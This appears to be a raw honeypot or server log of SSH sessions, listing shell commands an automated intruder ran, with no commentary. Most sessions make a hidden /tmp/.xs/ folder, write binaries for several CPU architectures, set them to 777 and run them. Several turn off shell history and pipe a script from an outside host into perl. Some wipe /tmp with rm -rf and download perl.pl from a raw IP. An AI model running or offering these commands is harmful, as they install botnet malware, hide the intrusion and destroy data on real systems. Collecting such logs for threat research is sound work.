0696191c5a874f8c97eebd2f1b9c8537	chmod 777 /tmp/.xs/daemon.armv4l.mod
0696191c5a874f8c97eebd2f1b9c8537	/tmp/.xs/daemon.armv4l.mod
e9a424de489e4f5fbc5ee8f163c5c562	mkdir /tmp/.xs/
e9a424de489e4f5fbc5ee8f163c5c562	cat  > /tmp/.xs/daemon.i686.mod
e9a424de489e4f5fbc5ee8f163c5c562	chmod 777 /tmp/.xs/daemon.i686.mod
e9a424de489e4f5fbc5ee8f163c5c562	/tmp/.xs/daemon.i686.mod
0b687c06b0264506816233bb8d37fc1b	mkdir /tmp/.xs/
0b687c06b0264506816233bb8d37fc1b	cat  > /tmp/.xs/daemon.mips.mod
0b687c06b0264506816233bb8d37fc1b	chmod 777 /tmp/.xs/daemon.mips.mod
0b687c06b0264506816233bb8d37fc1b	/tmp/.xs/daemon.mips.mod
21f7f1909633463f9d7f25f3e487bcaa	mkdir /tmp/.xs/
21f7f1909633463f9d7f25f3e487bcaa	cat  > /tmp/.xs/daemon.mipsel.mod
21f7f1909633463f9d7f25f3e487bcaa	chmod 777 /tmp/.xs/daemon.mipsel.mod
21f7f1909633463f9d7f25f3e487bcaa	/tmp/.xs/daemon.mipsel.mod
75b3149ac9674062840989bb646d49b0	mkdir /tmp/.xs/
75b3149ac9674062840989bb646d49b0	cat  > /tmp/.xs/test.mod
75b3149ac9674062840989bb646d49b0	chmod 777 /tmp/.xs/test.mod
75b3149ac9674062840989bb646d49b0	/tmp/.xs/test.mod
6ee283ff6b024e9ca098a08b23e691bc	mkdir /tmp/.xs/
6ee283ff6b024e9ca098a08b23e691bc	cat  > /tmp/.xs/daemon.armv4l.mod
6ee283ff6b024e9ca098a08b23e691bc	chmod 777 /tmp/.xs/daemon.armv4l.mod
6ee283ff6b024e9ca098a08b23e691bc	/tmp/.xs/daemon.armv4l.mod
493ad7e29095489b9e67d056beab5a5d	mkdir /tmp/.xs/
493ad7e29095489b9e67d056beab5a5d	cat  > /tmp/.xs/daemon.i686.mod
493ad7e29095489b9e67d056beab5a5d	chmod 777 /tmp/.xs/daemon.i686.mod
493ad7e29095489b9e67d056beab5a5d	/tmp/.xs/daemon.i686.mod
72d12e4838a44eba99a2cc8b534f66e2	mkdir /tmp/.xs/
72d12e4838a44eba99a2cc8b534f66e2	cat  > /tmp/.xs/daemon.mips.mod
72d12e4838a44eba99a2cc8b534f66e2	chmod 777 /tmp/.xs/daemon.mips.mod
72d12e4838a44eba99a2cc8b534f66e2	/tmp/.xs/daemon.mips.mod
451a305aa5ea4c918c9dacb8217f08b7	mkdir /tmp/.xs/
451a305aa5ea4c918c9dacb8217f08b7	cat  > /tmp/.xs/daemon.mipsel.mod
451a305aa5ea4c918c9dacb8217f08b7	chmod 777 /tmp/.xs/daemon.mipsel.mod
451a305aa5ea4c918c9dacb8217f08b7	/tmp/.xs/daemon.mipsel.mod
dec98f3d756d45d4bdc18c3454c7e04c	mkdir /tmp/.xs/
dec98f3d756d45d4bdc18c3454c7e04c	cat  > /tmp/.xs/test.mod
dec98f3d756d45d4bdc18c3454c7e04c	chmod 777 /tmp/.xs/test.mod
dec98f3d756d45d4bdc18c3454c7e04c	/tmp/.xs/test.mod
2ee6f084990640a581a051dd6781a868	mkdir /tmp/.xs/
2ee6f084990640a581a051dd6781a868	cat  > /tmp/.xs/daemon.armv4l.mod
2ee6f084990640a581a051dd6781a868	chmod 777 /tmp/.xs/daemon.armv4l.mod
2ee6f084990640a581a051dd6781a868	/tmp/.xs/daemon.armv4l.mod
866eb1aed3b84eac8eea20335228218b	mkdir /tmp/.xs/
866eb1aed3b84eac8eea20335228218b	cat  > /tmp/.xs/daemon.i686.mod
866eb1aed3b84eac8eea20335228218b	chmod 777 /tmp/.xs/daemon.i686.mod
866eb1aed3b84eac8eea20335228218b	/tmp/.xs/daemon.i686.mod
3399c3417cc84c019b71cd76d9c1d26b	mkdir /tmp/.xs/
3399c3417cc84c019b71cd76d9c1d26b	cat  > /tmp/.xs/daemon.mips.mod
3399c3417cc84c019b71cd76d9c1d26b	chmod 777 /tmp/.xs/daemon.mips.mod
3399c3417cc84c019b71cd76d9c1d26b	/tmp/.xs/daemon.mips.mod
39b9426d591843b79c0ba30c280e7939	mkdir /tmp/.xs/
39b9426d591843b79c0ba30c280e7939	cat  > /tmp/.xs/daemon.mipsel.mod
39b9426d591843b79c0ba30c280e7939	chmod 777 /tmp/.xs/daemon.mipsel.mod
39b9426d591843b79c0ba30c280e7939	/tmp/.xs/daemon.mipsel.mod
77ffc4048c7e4859bd15be9712792df7	mkdir /tmp/.xs/
77ffc4048c7e4859bd15be9712792df7	cat  > /tmp/.xs/test.mod
77ffc4048c7e4859bd15be9712792df7	chmod 777 /tmp/.xs/test.mod
77ffc4048c7e4859bd15be9712792df7	/tmp/.xs/test.mod
2ccb6af2348640a5a8227f395ad72b2d	mkdir /tmp/.xs/
2ccb6af2348640a5a8227f395ad72b2d	cat  > /tmp/.xs/daemon.armv4l.mod
2ccb6af2348640a5a8227f395ad72b2d	chmod 777 /tmp/.xs/daemon.armv4l.mod
2ccb6af2348640a5a8227f395ad72b2d	/tmp/.xs/daemon.armv4l.mod
5cf00069ed334d15b1f304f16b6aa0a8	mkdir /tmp/.xs/
5cf00069ed334d15b1f304f16b6aa0a8	cat  > /tmp/.xs/daemon.i686.mod
5cf00069ed334d15b1f304f16b6aa0a8	chmod 777 /tmp/.xs/daemon.i686.mod
5cf00069ed334d15b1f304f16b6aa0a8	/tmp/.xs/daemon.i686.mod
2ba8ce3fd2fe4942b9ec5227be0bd320	mkdir /tmp/.xs/
2ba8ce3fd2fe4942b9ec5227be0bd320	cat  > /tmp/.xs/daemon.mips.mod
2ba8ce3fd2fe4942b9ec5227be0bd320	chmod 777 /tmp/.xs/daemon.mips.mod
2ba8ce3fd2fe4942b9ec5227be0bd320	/tmp/.xs/daemon.mips.mod
fbecf45fa4a447fab8b8e17cab4122e4	mkdir /tmp/.xs/
fbecf45fa4a447fab8b8e17cab4122e4	cat  > /tmp/.xs/daemon.mipsel.mod
fbecf45fa4a447fab8b8e17cab4122e4	chmod 777 /tmp/.xs/daemon.mipsel.mod
fbecf45fa4a447fab8b8e17cab4122e4	/tmp/.xs/daemon.mipsel.mod
2294de411ecc48e9b75e994f28a755da	mkdir /tmp/.xs/
2294de411ecc48e9b75e994f28a755da	cat  > /tmp/.xs/test.mod
2294de411ecc48e9b75e994f28a755da	chmod 777 /tmp/.xs/test.mod
2294de411ecc48e9b75e994f28a755da	/tmp/.xs/test.mod
1b18202d14fb43f2927abe326796f5db	set +o history
1b18202d14fb43f2927abe326796f5db	wget -qO - http://musti.be/lul  |  perl
71be4964615f4eb5ab3e42fbaa3dfd68	set +o history
71be4964615f4eb5ab3e42fbaa3dfd68	wget -qO - http://musti.be/lul  |  perl
1b18202d14fb43f2927abe326796f5db	exit
71be4964615f4eb5ab3e42fbaa3dfd68	exit
b1a60dcfd87c47d4a68b026e55f3a5cb	echo -n test
b1a60dcfd87c47d4a68b026e55f3a5cb	cat /proc/version
e5b35197b167426fb19185fcd4669489	mkdir /tmp/.xs/
e5b35197b167426fb19185fcd4669489	cat  > /tmp/.xs/daemon.armv4l.mod
e5b35197b167426fb19185fcd4669489	chmod 777 /tmp/.xs/daemon.armv4l.mod
e5b35197b167426fb19185fcd4669489	/tmp/.xs/daemon.armv4l.mod
97df030d9d7246c6bd20bb0b91b49e92	mkdir /tmp/.xs/
97df030d9d7246c6bd20bb0b91b49e92	cat  > /tmp/.xs/daemon.i686.mod
97df030d9d7246c6bd20bb0b91b49e92	chmod 777 /tmp/.xs/daemon.i686.mod
97df030d9d7246c6bd20bb0b91b49e92	/tmp/.xs/daemon.i686.mod
1295d06fe52b4a4f836d55a0f38aa4c9	mkdir /tmp/.xs/
1295d06fe52b4a4f836d55a0f38aa4c9	cat  > /tmp/.xs/daemon.mips.mod
1295d06fe52b4a4f836d55a0f38aa4c9	chmod 777 /tmp/.xs/daemon.mips.mod
1295d06fe52b4a4f836d55a0f38aa4c9	/tmp/.xs/daemon.mips.mod
ee0271a6f94c462db2d80d93f2d70d84	mkdir /tmp/.xs/
ee0271a6f94c462db2d80d93f2d70d84	cat  > /tmp/.xs/daemon.mipsel.mod
ee0271a6f94c462db2d80d93f2d70d84	chmod 777 /tmp/.xs/daemon.mipsel.mod
ee0271a6f94c462db2d80d93f2d70d84	/tmp/.xs/daemon.mipsel.mod
8c43af19403744348d197089272d7cbd	mkdir /tmp/.xs/
8c43af19403744348d197089272d7cbd	cat  > /tmp/.xs/test.mod
8c43af19403744348d197089272d7cbd	chmod 777 /tmp/.xs/test.mod
8c43af19403744348d197089272d7cbd	/tmp/.xs/test.mod
480a99e56cfe42e88d6839436d2796e1	echo -n test
480a99e56cfe42e88d6839436d2796e1	cat /proc/version
a489ee6a013f48f9befe1e62bccae617	mkdir /tmp/.xs/
a489ee6a013f48f9befe1e62bccae617	cat  > /tmp/.xs/daemon.armv4l.mod
a489ee6a013f48f9befe1e62bccae617	chmod 777 /tmp/.xs/daemon.armv4l.mod
a489ee6a013f48f9befe1e62bccae617	/tmp/.xs/daemon.armv4l.mod
8cf82e69cb514cd68dd12af433fe726a	mkdir /tmp/.xs/
8cf82e69cb514cd68dd12af433fe726a	cat  > /tmp/.xs/daemon.i686.mod
8cf82e69cb514cd68dd12af433fe726a	chmod 777 /tmp/.xs/daemon.i686.mod
8cf82e69cb514cd68dd12af433fe726a	/tmp/.xs/daemon.i686.mod
3b1b41d3aaa648e6a9f03fbb21da7d14	mkdir /tmp/.xs/
3b1b41d3aaa648e6a9f03fbb21da7d14	cat  > /tmp/.xs/daemon.mips.mod
3b1b41d3aaa648e6a9f03fbb21da7d14	chmod 777 /tmp/.xs/daemon.mips.mod
3b1b41d3aaa648e6a9f03fbb21da7d14	/tmp/.xs/daemon.mips.mod
02341904ec50472fb493c0804fa0654d	mkdir /tmp/.xs/
02341904ec50472fb493c0804fa0654d	cat  > /tmp/.xs/daemon.mipsel.mod
02341904ec50472fb493c0804fa0654d	chmod 777 /tmp/.xs/daemon.mipsel.mod
02341904ec50472fb493c0804fa0654d	/tmp/.xs/daemon.mipsel.mod
eaa549d0c80b4c1ca9b2bcd7b9a7f814	mkdir /tmp/.xs/
eaa549d0c80b4c1ca9b2bcd7b9a7f814	cat  > /tmp/.xs/test.mod
eaa549d0c80b4c1ca9b2bcd7b9a7f814	chmod 777 /tmp/.xs/test.mod
eaa549d0c80b4c1ca9b2bcd7b9a7f814	/tmp/.xs/test.mod
021958e1e6e24fb78a04a86cdcee7c33	set +o history
021958e1e6e24fb78a04a86cdcee7c33	wget -qO - http://musti.be/lul  |  perl
a453bccf213a44b089532a476578ed09	set +o history
a453bccf213a44b089532a476578ed09	wget -qO - http://musti.be/lul  |  perl
a453bccf213a44b089532a476578ed09	exit
64a4f818c9c446da9d9b9fb35d15b3bd	echo -n test
64a4f818c9c446da9d9b9fb35d15b3bd	cat /proc/version
4e620a81a3034ffa82b0d2b3f394a69a	mkdir /tmp/.xs/
4e620a81a3034ffa82b0d2b3f394a69a	cat  > /tmp/.xs/daemon.armv4l.mod
4e620a81a3034ffa82b0d2b3f394a69a	chmod 777 /tmp/.xs/daemon.armv4l.mod
4e620a81a3034ffa82b0d2b3f394a69a	/tmp/.xs/daemon.armv4l.mod
db88fa55767d467ba2c2a27603471e00	mkdir /tmp/.xs/
db88fa55767d467ba2c2a27603471e00	cat  > /tmp/.xs/daemon.i686.mod
db88fa55767d467ba2c2a27603471e00	chmod 777 /tmp/.xs/daemon.i686.mod
db88fa55767d467ba2c2a27603471e00	/tmp/.xs/daemon.i686.mod
5e38a138909847789c61146fe82cc390	mkdir /tmp/.xs/
5e38a138909847789c61146fe82cc390	cat  > /tmp/.xs/daemon.mips.mod
5e38a138909847789c61146fe82cc390	chmod 777 /tmp/.xs/daemon.mips.mod
5e38a138909847789c61146fe82cc390	/tmp/.xs/daemon.mips.mod
4bc9d7d692a047d894e0594595651ff4	mkdir /tmp/.xs/
4bc9d7d692a047d894e0594595651ff4	cat  > /tmp/.xs/daemon.mipsel.mod
4bc9d7d692a047d894e0594595651ff4	chmod 777 /tmp/.xs/daemon.mipsel.mod
4bc9d7d692a047d894e0594595651ff4	/tmp/.xs/daemon.mipsel.mod
600eed884cda41239dd58cf80899ab7e	mkdir /tmp/.xs/
600eed884cda41239dd58cf80899ab7e	cat  > /tmp/.xs/test.mod
600eed884cda41239dd58cf80899ab7e	chmod 777 /tmp/.xs/test.mod
600eed884cda41239dd58cf80899ab7e	/tmp/.xs/test.mod
2ac390138e73438da397004a986f6ad0	cd /tmp
2ac390138e73438da397004a986f6ad0	rm -rf *
2ac390138e73438da397004a986f6ad0	wget -q http://188.209.52.52/perl.pl
cba159b399544b618444857b615682c5	cd /tmp
cba159b399544b618444857b615682c5	rm -rf *
cba159b399544b618444857b615682c5	wget -q http://188.209.52.52/perl.pl
d5ce52124c5948b182a92ef9066ab6a5	echo -n test
d5ce52124c5948b182a92ef9066ab6a5	cat /proc/version
0e8fc0bc8fc945328871efa11658bb0e	mkdir /tmp/.xs/
0e8fc0bc8fc945328871efa11658bb0e	cat  > /tmp/.xs/daemon.armv4l.mod
0e8fc0bc8fc945328871efa11658bb0e	chmod 777 /tmp/.xs/daemon.armv4l.mod
0e8fc0bc8fc945328871efa11658bb0e	/tmp/.xs/daemon.armv4l.mod
7251f7511af946b6bf0c2cdfb18af3f7	mkdir /tmp/.xs/
7251f7511af946b6bf0c2cdfb18af3f7	cat  > /tmp/.xs/daemon.i686.mod
7251f7511af946b6bf0c2cdfb18af3f7	chmod 777 /tmp/.xs/daemon.i686.mod
7251f7511af946b6bf0c2cdfb18af3f7	/tmp/.xs/daemon.i686.mod
ebda181dfe7246ed9f873d2b50237671	mkdir /tmp/.xs/
ebda181dfe7246ed9f873d2b50237671	cat  > /tmp/.xs/daemon.mips.mod
ebda181dfe7246ed9f873d2b50237671	chmod 777 /tmp/.xs/daemon.mips.mod
ebda181dfe7246ed9f873d2b50237671	/tmp/.xs/daemon.mips.mod
24d146a7851647a3875ffc750d7c0198	mkdir /tmp/.xs/
24d146a7851647a3875ffc750d7c0198	cat  > /tmp/.xs/daemon.mipsel.mod
24d146a7851647a3875ffc750d7c0198	chmod 777 /tmp/.xs/daemon.mipsel.mod
24d146a7851647a3875ffc750d7c0198	/tmp/.xs/daemon.mipsel.mod
ce9c0e26d07742fcb10f4f5cbbb4fec1	mkdir /tmp/.xs/
ce9c0e26d07742fcb10f4f5cbbb4fec1	cat  > /tmp/.xs/test.mod
ce9c0e26d07742fcb10f4f5cbbb4fec1	chmod 777 /tmp/.xs/test.mod
ce9c0e26d07742fcb10f4f5cbbb4fec1	/tmp/.xs/test.mod
01d7ab8a70db4bd382e811799b918f08	echo -n test
01d7ab8a70db4bd382e811799b918f08	cat /proc/version
9a01bff9f2614a9594717ed0ef8ac078	mkdir /tmp/.xs/
9a01bff9f2614a9594717ed0ef8ac078	cat  > /tmp/.xs/daemon.armv4l.mod
9a01bff9f2614a9594717ed0ef8ac078	chmod 777 /tmp/.xs/daemon.armv4l.mod
9a01bff9f2614a9594717ed0ef8ac078	/tmp/.xs/daemon.armv4l.mod
deb5341d8eb645fb809234f932b5e01c	mkdir /tmp/.xs/
deb5341d8eb645fb809234f932b5e01c	cat  > /tmp/.xs/daemon.i686.mod
deb5341d8eb645fb809234f932b5e01c	chmod 777 /tmp/.xs/daemon.i686.mod
deb5341d8eb645fb809234f932b5e01c	/tmp/.xs/daemon.i686.mod
3122e01849554952a1236322fe35e92d	mkdir /tmp/.xs/
3122e01849554952a1236322fe35e92d	cat  > /tmp/.xs/daemon.mips.mod
3122e01849554952a1236322fe35e92d	chmod 777 /tmp/.xs/daemon.mips.mod
3122e01849554952a1236322fe35e92d	/tmp/.xs/daemon.mips.mod
4e82b74cc42345429711e7898330b11a	mkdir /tmp/.xs/
4e82b74cc42345429711e7898330b11a	cat  > /tmp/.xs/daemon.mipsel.mod
4e82b74cc42345429711e7898330b11a	chmod 777 /tmp/.xs/daemon.mipsel.mod
4e82b74cc42345429711e7898330b11a	/tmp/.xs/daemon.mipsel.mod
aede557fd3c24f0a982f1e4eb61779e3	mkdir /tmp/.xs/
aede557fd3c24f0a982f1e4eb61779e3	cat  > /tmp/.xs/test.mod
aede557fd3c24f0a982f1e4eb61779e3	chmod 777 /tmp/.xs/test.mod
aede557fd3c24f0a982f1e4eb61779e3	/tmp/.xs/test.mod
0b52cd65927e409aac90cded712f30d1	mkdir /tmp/.xs/
0b52cd65927e409aac90cded712f30d1	cat  > /tmp/.xs/daemon.armv4l.mod
0b52cd65927e409aac90cded712f30d1	chmod 777 /tmp/.xs/daemon.armv4l.mod
0b52cd65927e409aac90cded712f30d1	/tmp/.xs/daemon.armv4l.mod
ef8897d55f01471e9d862c375a6dfa33	mkdir /tmp/.xs/
ef8897d55f01471e9d862c375a6dfa33	cat  > /tmp/.xs/daemon.i686.mod
ef8897d55f01471e9d862c375a6dfa33	chmod 777 /tmp/.xs/daemon.i686.mod
ef8897d55f01471e9d862c375a6dfa33	/tmp/.xs/daemon.i686.mod
f332115a200049a4804dbabbd12be805	mkdir /tmp/.xs/
f332115a200049a4804dbabbd12be805	cat  > /tmp/.xs/daemon.mips.mod
f332115a200049a4804dbabbd12be805	chmod 777 /tmp/.xs/daemon.mips.mod
f332115a200049a4804dbabbd12be805	/tmp/.xs/daemon.mips.mod
9f4d7d277b4646d39fbf941256b4b800	mkdir /tmp/.xs/
9f4d7d277b4646d39fbf941256b4b800	cat  > /tmp/.xs/daemon.mipsel.mod
9f4d7d277b4646d39fbf941256b4b800	chmod 777 /tmp/.xs/daemon.mipsel.mod
9f4d7d277b4646d39fbf941256b4b800	/tmp/.xs/daemon.mipsel.mod
e6b2de7ed0ce4f9ca9fa3b29c9e535ab	mkdir /tmp/.xs/
e6b2de7ed0ce4f9ca9fa3b29c9e535ab	cat  > /tmp/.xs/test.mod
e6b2de7ed0ce4f9ca9fa3b29c9e535ab	chmod 777 /tmp/.xs/test.mod
e6b2de7ed0ce4f9ca9fa3b29c9e535ab	/tmp/.xs/test.mod
a6a781118aa94057b93dfbc91d3ca06a	mkdir /tmp/.xs/
a6a781118aa94057b93dfbc91d3ca06a	cat  > /tmp/.xs/daemon.armv4l.mod
a6a781118aa94057b93dfbc91d3ca06a	chmod 777 /tmp/.xs/daemon.armv4l.mod
a6a781118aa94057b93dfbc91d3ca06a	/tmp/.xs/daemon.armv4l.mod
69a47b6ed0d54c9bba9961487ac936bc	mkdir /tmp/.xs/
69a47b6ed0d54c9bba9961487ac936bc	cat  > /tmp/.xs/daemon.i686.mod
69a47b6ed0d54c9bba9961487ac936bc	chmod 777 /tmp/.xs/daemon.i686.mod
69a47b6ed0d54c9bba9961487ac936bc	/tmp/.xs/daemon.i686.mod
a552656a112f46ec8f25eaf11929253c	mkdir /tmp/.xs/
a552656a112f46ec8f25eaf11929253c	cat  > /tmp/.xs/daemon.mips.mod
a552656a112f46ec8f25eaf11929253c	chmod 777 /tmp/.xs/daemon.mips.mod
a552656a112f46ec8f25eaf11929253c	/tmp/.xs/daemon.mips.mod
a157dd485b944737bec036a74d342f96	mkdir /tmp/.xs/
a157dd485b944737bec036a74d342f96	cat  > /tmp/.xs/daemon.mipsel.mod
a157dd485b944737bec036a74d342f96	chmod 777 /tmp/.xs/daemon.mipsel.mod
a157dd485b944737bec036a74d342f96	/tmp/.xs/daemon.mipsel.mod
85001ae5042e41a980255d8bd297b6b3	mkdir /tmp/.xs/
85001ae5042e41a980255d8bd297b6b3	cat  > /tmp/.xs/test.mod
85001ae5042e41a980255d8bd297b6b3	chmod 777 /tmp/.xs/test.mod
85001ae5042e41a980255d8bd297b6b3	/tmp/.xs/test.mod
fd2550c626214168ae11680e8e5a1232	mkdir /tmp/.xs/
fd2550c626214168ae11680e8e5a1232	cat  > /tmp/.xs/daemon.armv4l.mod
fd2550c626214168ae11680e8e5a1232	chmod 777 /tmp/.xs/daemon.armv4l.mod
fd2550c626214168ae11680e8e5a1232	/tmp/.xs/daemon.armv4l.mod
0e59a6448c1641cdb457e4f8607ee7a0	mkdir /tmp/.xs/
0e59a6448c1641cdb457e4f8607ee7a0	cat  > /tmp/.xs/daemon.i686.mod
0e59a6448c1641cdb457e4f8607ee7a0	chmod 777 /tmp/.xs/daemon.i686.mod
0e59a6448c1641cdb457e4f8607ee7a0	/tmp/.xs/daemon.i686.mod
13cacb08901a4bcba6598c71af2c6bf6	mkdir /tmp/.xs/
13cacb08901a4bcba6598c71af2c6bf6	cat  > /tmp/.xs/daemon.mips.mod
13cacb08901a4bcba6598c71af2c6bf6	chmod 777 /tmp/.xs/daemon.mips.mod
13cacb08901a4bcba6598c71af2c6bf6	/tmp/.xs/daemon.mips.mod
3386459b28d8426ea1b253825c773d69	mkdir /tmp/.xs/
3386459b28d8426ea1b253825c773d69	cat  > /tmp/.xs/daemon.mipsel.mod
3386459b28d8426ea1b253825c773d69	chmod 777 /tmp/.xs/daemon.mipsel.mod
3386459b28d8426ea1b253825c773d69	/tmp/.xs/daemon.mipsel.mod
e0217f8c5c244f08872c877f38695e52	mkdir /tmp/.xs/
e0217f8c5c244f08872c877f38695e52	cat  > /tmp/.xs/test.mod
e0217f8c5c244f08872c877f38695e52	chmod 777 /tmp/.xs/test.mod
e0217f8c5c244f08872c877f38695e52	/tmp/.xs/test.mod
98720986b7514c06b18d048668903a5e	mkdir /tmp/.xs/
98720986b7514c06b18d048668903a5e	cat  > /tmp/.xs/daemon.armv4l.mod
98720986b7514c06b18d048668903a5e	chmod 777 /tmp/.xs/daemon.armv4l.mod
98720986b7514c06b18d048668903a5e	/tmp/.xs/daemon.armv4l.mod
a0e4bf356e2849479b84d8bbc4f31617	mkdir /tmp/.xs/
a0e4bf356e2849479b84d8bbc4f31617	cat  > /tmp/.xs/daemon.i686.mod
a0e4bf356e2849479b84d8bbc4f31617	chmod 777 /tmp/.xs/daemon.i686.mod
a0e4bf356e2849479b84d8bbc4f31617	/tmp/.xs/daemon.i686.mod
37040b181ce641659c13b4972d16434d	mkdir /tmp/.xs/
37040b181ce641659c13b4972d16434d	cat  > /tmp/.xs/daemon.mips.mod
37040b181ce641659c13b4972d16434d	chmod 777 /tmp/.xs/daemon.mips.mod
37040b181ce641659c13b4972d16434d	/tmp/.xs/daemon.mips.mod
7607189b700440daaf623f822847922d	mkdir /tmp/.xs/
7607189b700440daaf623f822847922d	cat  > /tmp/.xs/daemon.mipsel.mod
7607189b700440daaf623f822847922d	chmod 777 /tmp/.xs/daemon.mipsel.mod
7607189b700440daaf623f822847922d	/tmp/.xs/daemon.mipsel.mod
2783f3c46c184ef3a33dc67c9f9ed021	mkdir /tmp/.xs/
2783f3c46c184ef3a33dc67c9f9ed021	cat  > /tmp/.xs/test.mod
2783f3c46c184ef3a33dc67c9f9ed021	chmod 777 /tmp/.xs/test.mod
2783f3c46c184ef3a33dc67c9f9ed021	/tmp/.xs/test.mod
ecef33926b404648b5d5ed58ca214602	mkdir /tmp/.xs/
ecef33926b404648b5d5ed58ca214602	cat  > /tmp/.xs/daemon.armv4l.mod
ecef33926b404648b5d5ed58ca214602	chmod 777 /tmp/.xs/daemon.armv4l.mod
ecef33926b404648b5d5ed58ca214602	/tmp/.xs/daemon.armv4l.mod
f9c4768279f940c7a35473eefc00eb66	mkdir /tmp/.xs/
f9c4768279f940c7a35473eefc00eb66	cat  > /tmp/.xs/daemon.i686.mod
f9c4768279f940c7a35473eefc00eb66	chmod 777 /tmp/.xs/daemon.i686.mod
f9c4768279f940c7a35473eefc00eb66	/tmp/.xs/daemon.i686.mod
3a97479969274e70bcb9d40d91dc7bd0	mkdir /tmp/.xs/
3a97479969274e70bcb9d40d91dc7bd0	cat  > /tmp/.xs/daemon.mips.mod
3a97479969274e70bcb9d40d91dc7bd0	chmod 777 /tmp/.xs/daemon.mips.mod
3a97479969274e70bcb9d40d91dc7bd0	/tmp/.xs/daemon.mips.mod
322aeb579bad4738847b6d119afff60d	mkdir /tmp/.xs/
322aeb579bad4738847b6d119afff60d	cat  > /tmp/.xs/daemon.mipsel.mod
322aeb579bad4738847b6d119afff60d	chmod 777 /tmp/.xs/daemon.mipsel.mod
322aeb579bad4738847b6d119afff60d	/tmp/.xs/daemon.mipsel.mod
f2b7f77927964df987c6b13e6b09136d	mkdir /tmp/.xs/
f2b7f77927964df987c6b13e6b09136d	cat  > /tmp/.xs/test.mod
f2b7f77927964df987c6b13e6b09136d	chmod 777 /tmp/.xs/test.mod
f2b7f77927964df987c6b13e6b09136d	/tmp/.xs/test.mod
6031f3d587554846b4cec98130e490bc	mkdir /tmp/.xs/
6031f3d587554846b4cec98130e490bc	cat  > /tmp/.xs/daemon.armv4l.mod
6031f3d587554846b4cec98130e490bc	chmod 777 /tmp/.xs/daemon.armv4l.mod
6031f3d587554846b4cec98130e490bc	/tmp/.xs/daemon.armv4l.mod
9d29387b65dc4d01bcaf1ff2195fdea3	mkdir /tmp/.xs/
9d29387b65dc4d01bcaf1ff2195fdea3	cat  > /tmp/.xs/daemon.i686.mod
9d29387b65dc4d01bcaf1ff2195fdea3	chmod 777 /tmp/.xs/daemon.i686.mod
9d29387b65dc4d01bcaf1ff2195fdea3	/tmp/.xs/daemon.i686.mod
0950f7db177e4575ab74bfcea9e0f164	mkdir /tmp/.xs/
0950f7db177e4575ab74bfcea9e0f164	cat  > /tmp/.xs/daemon.mips.mod
0950f7db177e4575ab74bfcea9e0f164	chmod 777 /tmp/.xs/daemon.mips.mod
0950f7db177e4575ab74bfcea9e0f164	/tmp/.xs/daemon.mips.mod
1f39649667904324bb21bd5938424d5e	mkdir /tmp/.xs/
1f39649667904324bb21bd5938424d5e	cat  > /tmp/.xs/daemon.mipsel.mod
1f39649667904324bb21bd5938424d5e	chmod 777 /tmp/.xs/daemon.mipsel.mod
1f39649667904324bb21bd5938424d5e	/tmp/.xs/daemon.mipsel.mod
c1e2890410d343c9bdec6690e3650ca6	mkdir /tmp/.xs/
c1e2890410d343c9bdec6690e3650ca6	cat  > /tmp/.xs/test.mod
c1e2890410d343c9bdec6690e3650ca6	chmod 777 /tmp/.xs/test.mod
c1e2890410d343c9bdec6690e3650ca6	/tmp/.xs/test.mod
de79c7edf853432ca62683bca87aebb1	mkdir /tmp/.xs/
de79c7edf853432ca62683bca87aebb1	cat  > /tmp/.xs/daemon.armv4l.mod
de79c7edf853432ca62683bca87aebb1	chmod 777 /tmp/.xs/daemon.armv4l.mod
de79c7edf853432ca62683bca87aebb1	/tmp/.xs/daemon.armv4l.mod
04f49543e21d4c4088da534456912772	mkdir /tmp/.xs/
04f49543e21d4c4088da534456912772	cat  > /tmp/.xs/daemon.i686.mod
04f49543e21d4c4088da534456912772	chmod 777 /tmp/.xs/daemon.i686.mod
04f49543e21d4c4088da534456912772	/tmp/.xs/daemon.i686.mod
9e99c7930e974f0cb7eb250b68c20296	mkdir /tmp/.xs/
9e99c7930e974f0cb7eb250b68c20296	cat  > /tmp/.xs/daemon.mips.mod
9e99c7930e974f0cb7eb250b68c20296	chmod 777 /tmp/.xs/daemon.mips.mod
9e99c7930e974f0cb7eb250b68c20296	/tmp/.xs/daemon.mips.mod
d578c9796dd24bb09860b6d085d8caa8	mkdir /tmp/.xs/
d578c9796dd24bb09860b6d085d8caa8	cat  > /tmp/.xs/daemon.mipsel.mod
d578c9796dd24bb09860b6d085d8caa8	chmod 777 /tmp/.xs/daemon.mipsel.mod
d578c9796dd24bb09860b6d085d8caa8	/tmp/.xs/daemon.mipsel.mod
1a0f5616295b4f1686fb98ed2cf8d5cc	mkdir /tmp/.xs/
1a0f5616295b4f1686fb98ed2cf8d5cc	cat  > /tmp/.xs/test.mod
